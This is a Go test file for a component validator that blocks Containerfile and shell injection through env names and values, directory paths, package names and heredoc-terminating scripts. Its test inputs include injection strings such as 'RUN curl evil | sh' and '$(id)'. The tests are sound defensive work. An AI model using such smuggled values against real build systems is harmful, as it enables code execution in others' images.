package component

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// validBase returns a minimal valid mise component for mutation in tests.
func validBase() *Component {
	return &Component{
		Key:       "x",
		Name:      "X",
		Installer: Installer{Mise: &MiseInstaller{Tool: "x"}},
		Check:     Check{Command: "x --version"},
	}
}

// Components are declarative outside installer.script (FR-013): fields that
// end up in the Containerfile must not be able to add instructions or shell
// syntax to it.
func TestValidateRejectsContainerfileInjection(t *testing.T) {
	tests := map[string]struct {
		mutate func(c *Component)
		want   string
	}{
		"env name with space": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"A B": "x"}}
		}, `image.env name "A B"`},
		"env name with newline": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"A=1\nRUN id\nENV B": "x"}}
		}, "image.env name"},
		"env name with leading digit": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"1A": "x"}}
		}, "image.env name"},
		"env value with newline": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"A": "x\nRUN curl evil | sh"}}
		}, `image.env "A": value contains a control character`},
		"env value with carriage return": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"A": "x\ry"}}
		}, "control character"},
		"env value with tab": {func(c *Component) {
			c.Image = &ImageNeeds{Env: map[string]string{"A": "x\ty"}}
		}, "control character"},
		"dir path with newline": {func(c *Component) {
			c.Image = &ImageNeeds{Dirs: []Dir{{Path: "/opt/x\nRUN id"}}}
		}, "image.dirs path"},
		"dir path with shell syntax": {func(c *Component) {
			c.Image = &ImageNeeds{Dirs: []Dir{{Path: "/opt/x;id"}}}
		}, "image.dirs path"},
		"dir path with space": {func(c *Component) {
			c.Image = &ImageNeeds{Dirs: []Dir{{Path: "/opt/x /etc"}}}
		}, "image.dirs path"},
		"dir path with substitution": {func(c *Component) {
			c.Image = &ImageNeeds{Dirs: []Dir{{Path: "/opt/$(id)"}}}
		}, "image.dirs path"},
		"read_write path with newline": {func(c *Component) {
			c.Image = &ImageNeeds{ReadWrite: []string{"/opt/x\ny"}}
		}, "control character"},
		"read_only path with NUL": {func(c *Component) {
			c.Image = &ImageNeeds{ReadOnly: []string{"/opt/x\x00"}}
		}, "control character"},
		"runtime glob with newline": {func(c *Component) {
			c.Image = &ImageNeeds{RuntimeGlobs: []string{"/opt/x/*\n"}}
		}, "control character"},
		"package with shell syntax": {func(c *Component) {
			c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"apt-get": {"curl;id"}}}}
		}, `installer.package.packages.apt-get: "curl;id" is not a valid package name`},
		"package with newline": {func(c *Component) {
			c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"dnf": {"curl\nRUN id"}}}}
		}, "is not a valid package name"},
		"package with space": {func(c *Component) {
			c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"apk": {"curl git"}}}}
		}, "is not a valid package name"},
		"package option": {func(c *Component) {
			c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"yum": {"--nogpgcheck"}}}}
		}, "is not a valid package name"},
		"package redirect": {func(c *Component) {
			c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"apk": {"curl>8"}}}}
		}, "is not a valid package name"},
		"script ends the heredoc": {func(c *Component) {
			c.Installer = Installer{Script: &ScriptInstaller{Run: "echo hi\nSANDCAST_EOF\nRUN curl evil | sh\n"}}
		}, "installer.script.run must not contain a line equal to the heredoc delimiter SANDCAST_EOF"},
		"script ends the heredoc with whitespace": {func(c *Component) {
			c.Installer = Installer{Script: &ScriptInstaller{Run: "echo hi\n\tSANDCAST_EOF \r\nADD x y"}}
		}, "heredoc delimiter"},
	}
	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			c := validBase()
			tc.mutate(c)
			err := c.Validate()
			require.Error(t, err)
			assert.Contains(t, err.Error(), tc.want)
			assert.NotContains(t, err.Error(), "\n", "messages quote control characters")
		})
	}
}

func TestValidateAcceptsDeclarativeValues(t *testing.T) {
	c := validBase()
	c.Image = &ImageNeeds{
		Env: map[string]string{
			"GOPATH": "/opt/go", "_X": `a b "c" $d \e`, "PATH_2": "",
		},
		Dirs:         []Dir{{Path: "/opt/go"}, {Path: "/opt/x_y/v1.2+b@c-d"}, {Path: "/"}},
		ReadWrite:    []string{"/opt/go"},
		RuntimeGlobs: []string{"/opt/go/pkg/mod/golang.org/toolchain@*/bin/*"},
	}
	require.NoError(t, c.Validate())

	for _, pkgs := range map[string][]string{
		"apt-get": {"ca-certificates", "libssl3", "g++", "python3.12", "curl=8.5.0-2ubuntu10", "libc6:amd64", "nodejs=1:20.1~deb12"},
		"dnf":     {"iproute", "gcc-c++", "python3.12", "perl-Digest-SHA"},
		"apk":     {"iproute2", "curl~8.5", "ripgrep@edge"},
	} {
		c := validBase()
		c.Installer = Installer{Package: &PackageInstaller{Packages: map[string][]string{"apt-get": pkgs}}}
		require.NoError(t, c.Validate(), "%v", pkgs)
	}

	c = validBase()
	c.Installer = Installer{Script: &ScriptInstaller{Run: "cat <<EOF\nSANDCAST_EOF_NOT\necho SANDCAST_EOF\nEOF\n"}}
	require.NoError(t, c.Validate())
}

func TestValidPackageName(t *testing.T) {
	assert.True(t, ValidPackageName("ca-certificates"))
	assert.True(t, ValidPackageName("g++"))
	for _, n := range []string{"", "-x", ".x", "a b", "a;b", "a|b", "a&b", "a$b", "a`b", "a'b", "a\nb", "a*", "a>1", "a<1", "a/b", "a\\b"} {
		assert.False(t, ValidPackageName(n), "%q", n)
	}
}
